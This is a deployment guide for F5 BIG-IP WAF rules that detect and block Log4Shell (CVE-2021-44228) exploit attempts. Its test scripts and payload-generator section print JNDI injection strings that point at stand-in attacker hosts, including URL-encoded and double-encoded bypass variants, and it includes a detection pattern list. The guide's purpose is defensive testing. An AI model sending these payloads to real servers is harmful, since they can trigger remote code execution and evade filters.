# Scenario 3: Custom Zero-Day Signature (Log4Shell) - Deployment Guide

## 📋 Pre-Deployment Checklist

Before deploying this zero-day detection rule:

- [ ] F5 BIG-IP with Advanced WAF module (v17.5.x+)
- [ ] Administrator SSH and GUI access
- [ ] Existing WAF policy on virtual server
- [ ] iRule events enabled in WAF policy
- [ ] ASM event logging enabled
- [ ] Knowledge of Log4Shell CVE-2021-44228 threats
- [ ] Test payloads ready for validation

---

## 🖥️ Deployment Option 1: iRule Only (Quick)

### Step 1: Create iRule in BIG-IP GUI

1. Login to BIG-IP: `https://<BIG_IP_HOST>:443`
2. Navigate to **Security** > **Application Security** > **iRules**
3. Click **Create**
4. Fill in:
   - **Name**: `custom_zerodday_detection_rule`
   - **Definition**: (Paste full content from `rule.tcl`)
5. Click **Create**

### Step 2: Attach iRule to Virtual Server

1. Go to **Local Traffic** > **Virtual Servers**
2. Click your target virtual server
3. Under **iRules**, move to Selected:
   - `custom_zerodday_detection_rule`
4. Click **Update**

### Step 3: Verify Deployment

```bash
ssh admin@<BIG_IP_HOST>
tmsh

# Verify iRule loaded
list ltm irule custom_zerodday_detection_rule

# Verify attached to VS
show ltm virtual <VS_NAME> rules
```

---

## 🖥️ Deployment Option 2: Attack Signature Import (Preferred)

### Step 1: Import Custom Attack Signature

#### Method A: GUI Import

1. Navigate to **Security** > **Application Security** > **Attack Signatures** > **User-Defined Signatures**
2. Click **Import**
3. Select `attack-signature.xml` file
4. Click **Import**
5. Verify import succeeds

#### Method B: TMSH Import

```bash
ssh admin@<BIG_IP_HOST>
tmsh

# Import the custom signature XML
modify asm policy <POLICY_NAME> \
  import attack-signatures file /tmp/attack-signature.xml

# Verify import
show asm policy <POLICY_NAME> custom-signatures
```

### Step 2: Verify Signatures Loaded

```bash
tmsh

# List imported custom attack signatures
list asm policy <POLICY_NAME> user-defined-signatures

# Expected output shows:
# Custom_JNDI_LDAP_Injection (ID 9800001)
# Custom_JNDI_RMI_Injection (ID 9800002)
# etc.
```

---

## 🖥️ Deployment Option 3: Combined iRule + Signature (Best Practice)

### Comprehensive Deployment Steps

```bash
# SSH to BIG-IP
ssh admin@<BIG_IP_HOST>
tmsh

# ========================================================================
# Step 1: Create the iRule
# ========================================================================

cat > /tmp/zerodday_rule.tcl <<'EOF'
[PASTE THE FULL CONTENT OF rule.tcl HERE]
EOF

create ltm irule custom_zerodday_detection_rule \
  definition-file /tmp/zerodday_rule.tcl

# ========================================================================
# Step 2: Import Attack Signatures
# ========================================================================

modify asm policy <POLICY_NAME> \
  import attack-signatures file /tmp/attack-signature.xml

# ========================================================================
# Step 3: Attach iRule to Virtual Server
# ========================================================================

modify ltm virtual <VS_NAME> \
  rules { custom_zerodday_detection_rule }

# ========================================================================
# Step 4: Enable ASM Enforcement Mode
# ========================================================================

modify asm policy <POLICY_NAME> \
  policy-status enabled \
  blocking-policy enabled \
  learning-mode disabled \
  codeBlockingPolicy enabled \
  logAll enabled

# ========================================================================
# Step 5: Apply Policy to Virtual Server
# ========================================================================

modify ltm virtual <VS_NAME> \
  policies { <POLICY_NAME> }

# Save configuration
quit
tmsh save sys config
```

---

## 🧪 Test Deployment

### Test 1: Detect JNDI:LDAP Pattern (Should Block)

```bash
#!/bin/bash
# Script: test_jndi_ldap.sh

TARGET_HOST="10.20.30.40"
PAYLOAD="jndi:ldap://attacker.com/obj"

echo "[Test 1] JNDI:LDAP Detection"
echo "==========================="
echo ""

# Test in URI
echo "[1] Testing pattern in URI..."
curl -i -X GET "http://${TARGET_HOST}/app?param=${PAYLOAD}" 2>&1 | grep "^HTTP"

# Expected: HTTP/1.1 403 Forbidden

# Test 2: JNDI in POST body
echo "[2] Testing pattern in POST body..."
curl -i -X POST "http://${TARGET_HOST}/submit" \
  -d "data=${PAYLOAD}" \
  -H "Content-Type: application/x-www-form-urlencoded" 2>&1 | grep "^HTTP"

# Expected: HTTP/1.1 403 Forbidden

# Test 3: JNDI in header
echo "[3] Testing pattern in header..."
curl -i -X GET "http://${TARGET_HOST}/app" \
  -H "X-Custom-Header: ${PAYLOAD}" 2>&1 | grep "^HTTP"

# Expected: HTTP/1.1 403 Forbidden
```

### Test 2: Detect JNDI:RMI Pattern (Should Block)

```bash
#!/bin/bash

TARGET_HOST="10.20.30.40"
RMI_PAYLOAD="jndi:rmi://rce.attacker.com:1099/Exploit"

echo "[Test 2] JNDI:RMI Detection"
echo "=========================="
echo ""

curl -i -X GET "http://${TARGET_HOST}/api?logging=${RMI_PAYLOAD}"

# Expected: HTTP/1.1 403 Forbidden
```

### Test 3: URL-Encoded JNDI Pattern (Should Block)

```bash
#!/bin/bash

TARGET_HOST="10.20.30.40"
# URL-encoded: "jndi:ldap://" = "%6a%6e%64%69%3a%6c%64%61%70%3a%2f%2f"
ENCODED_PAYLOAD="%6a%6e%64%69%3a%6c%64%61%70%3a%2f%2fexploit"

echo "[Test 3] URL-Encoded JNDI Detection"
echo "==================================="
echo ""

curl -i -X GET "http://${TARGET_HOST}/search?q=${ENCODED_PAYLOAD}"

# Expected: HTTP/1.1 403 Forbidden
```

### Test 4: Legitimate Requests (Should NOT Block)

```bash
#!/bin/bash

TARGET_HOST="10.20.30.40"

echo "[Test 4] Legitimate Requests (Should Succeed)"
echo "============================================"
echo ""

# Test normal request
echo "[1] Normal GET request..."
curl -i -X GET "http://${TARGET_HOST}/app?name=john&age=30" 2>&1 | grep "^HTTP"

# Expected: HTTP/1.1 200 OK (or appropriate success code)

# Test POST with normal data
echo "[2] Normal POST request..."
curl -i -X POST "http://${TARGET_HOST}/submit" \
  -d "username=testuser&password=secure123" 2>&1 | grep "^HTTP"

# Expected: HTTP/1.1 200 OK
```

---

## 📊 Verification Commands

### Monitor Detections in Real-Time

```bash
ssh admin@<BIG_IP_HOST>

# Stream zero-day detection events
tail -f /var/log/asm | grep "CUSTOM_ZERODDAY"

# Filter for blocked attacks
tail -f /var/log/asm | grep "CUSTOM_ZERODDAY_BLOCKED"

# Filter for logged events (log-only mode)
tail -f /var/log/asm | grep "CUSTOM_ZERODDAY_LOGGED"
```

### Check ASM Events via TMSH

```bash
tmsh

# View recent security events
show asm events | grep Custom_ZeroDay

# Check violation statistics
show ltm event-processing statistics
```

### View Matched Payload Details

```bash
ssh admin@<BIG_IP_HOST>

# Extract full attack details from logs
grep "CUSTOM_ZERODDAY_DETECTED" /var/log/asm | tail -10

# Sample output:
# CUSTOM_ZERODDAY_DETECTED: Client=203.0.113.45 Method=GET URI=/app?param=jndi:ldap://attacker.com Location=uri Pattern=jndi:ldap:// Payload=[jndi:ldap://attacker.com/obj]
```

---

## 🔍 Advanced Configuration

### Adjust Detection Sensitivity

**Edit rule.tcl to tune behavior:**

#### Log-Only Mode (For Testing)

```tcl
# Change BLOCK_ACTION to log-only (no blocking)
set BLOCK_ACTION 0    ;# 1=Block, 0=Log only

# In this mode:
# - Attacks are detected and logged
# - Requests are NOT blocked
# - Useful for tuning false-positives
# - Monitor ASM logs for 24-48 hours before enabling blocking
```

#### Disable Full Payload Logging (Performance)

```tcl
# For high-throughput environments, reduce logging overhead
set LOG_PAYLOAD 0    ;# 0=Log match only, 1=Log full payload
```

#### Extend Detection Patterns

```tcl
# Add additional patterns to detect
set JNDI_PATTERNS [list \
  "jndi:ldap://" \
  "jndi:rmi://" \
  "jndi:nis://" \
  "jndi:iiop://" \
  "${jndi" \
  "log4j:" \
]
```

#### Change Response Format

```tcl
# Use HTML instead of JSON for responses
set BLOCK_RESPONSE_JSON 0    ;# 0=HTML, 1=JSON
```

---

## 🚀 Production Deployment Phases

### Phase 1: Development (Week 1)
- Deploy both iRule and signatures
- Set to log-only mode
- Test with known Log4Shell payloads
- Review ASM logs, check for false positives

### Phase 2: Staging (Week 2)
- Enable blocking mode
- Run 48-hour production simulation
- Monitor legitimate traffic
- Finalize tuning

### Phase 3: Production (Week 3)
- Deploy during maintenance window
- Enable full blocking
- Maintain 24/7 monitoring
- Prepare rollback plan

---

## ⚠️ Known Limitations & Considerations

### False Positives

Pattern `jndi:ldap://` could appear in:
- Legitimate logging configuration files
- Comments in source code
- Support tickets/documentation

**Mitigation**:
- Deploy in log-only mode first
- Create URI/header whitelist exceptions
- Review ASM logs before enabling blocking

### Performance Impact

- **Pattern Detection Overhead**: <1ms per request
- **Payload Scanning**: ~5ms for large bodies (mitigated by 1MB limit)
- **Total Impact**: <2% CPU increase for typical throughput

### Content Encoding

The rule searches for patterns in:
- Raw URI
- Raw headers
- Decoded request body

Does NOT currently detect:
- Unicode-encoded patterns
- HTML entity encoding
- Double URL encoding

**Future Enhancement**: Add multi-layer decoding for obfuscated payloads

---

## 🔄 AS3 Declarative Deployment

### AS3 Policy with Custom Signatures

```json
{
  "class": "AS3",
  "action": "deploy",
  "declaration": {
    "class": "ADC",
    "zerodday_protection": {
      "class": "Tenant",
      "app": {
        "class": "Application",
        "vs": {
          "class": "Service_HTTP",
          "virtualPort": 80,
          "policyWAF": {
            "use": "waf_policy"
          },
          "iRules": [
            "/Common/custom_zerodday_detection_rule"
          ]
        },
        "waf_policy": {
          "class": "WAF_Policy",
          "url": "/file?id=zerodday_waf_policy.json"
        }
      }
    }
  }
}
```

---

## 🧪 Attack Simulation for Testing

### Generate Log4Shell Payloads

```bash
#!/bin/bash
# Script: generate_log4shell_payloads.sh

# Basic LDAP payload
echo "Payload 1 (LDAP): jndi:ldap://attacker.com:389/ou=Exploit"

# RMI payload
echo "Payload 2 (RMI): jndi:rmi://attacker.com:1099/Exploit"

# DNSJNDI payload
echo "Payload 3: jndi:dns://attacker.com/Exploit"

# Encoded payload (for bypass testing)
echo "Payload 4 (URL-Encoded): %6a%6e%64%69%3a%6c%64%61%70%3a%2f%2fattacker.com"

# Double-encoded payload
echo "Payload 5 (Double-Encoded): %256a%256e%256469%253a%256c%2564%2561%2570%253a%252f%252f"
```

---

## ✅ Deployment Checklist

- [ ] iRule created and tested in lab
- [ ] Attack signatures imported successfully
- [ ] Both iRule and signatures attached to policy
- [ ] ASM event logging enabled
- [ ] Test Case 1-4 passed successfully
- [ ] No false positives in legitimate traffic
- [ ] ASM logs monitored and validated
- [ ] Production deployment scheduled
- [ ] Rollback plan documented
- [ ] Team trained on operation

---

## 📞 Rollback Procedure

If issues occur, rollback using:

```bash
tmsh

# Remove iRule from virtual server
modify ltm virtual <VS_NAME> rules { }

# Disable or delete signatures
modify asm policy <POLICY_NAME> delete user-defined-signatures

# Restore previous policy (if backup exists)
# modify asm policy <POLICY_NAME> import policy file <backup.xml>

quit
tmsh save sys config
```

---

**Last Updated**: March 2026 | **TMOS Version**: 17.5.x+
